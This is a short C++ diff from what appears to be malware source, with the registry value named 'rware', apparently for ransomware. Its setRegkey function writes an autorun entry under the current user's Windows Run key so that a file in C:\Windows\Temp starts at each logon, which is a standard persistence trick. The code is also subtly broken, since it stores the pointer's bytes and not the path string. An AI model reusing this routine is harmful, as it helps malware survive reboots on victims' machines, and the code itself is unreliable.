@@ -33,7 +33,7 @@ int checkForRegkey() {
 int setRegkey() {
 
 
-	LPCWSTR path = L"C:\\Windows\\Temp\\truc.txt";
+	LPCWSTR path = L"C:\\Windows\\Temp\\placeholder";
 	if (RegSetKeyValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"rware", REG_SZ, LPBYTE(&path), sizeof(path)) == ERROR_SUCCESS) {
 
 		//std::cout << "Key created" << std::endl;
@@ -46,5 +46,6 @@ int setRegkey() {
 		return -1;
 
 	}
+
 	return 0;
 }
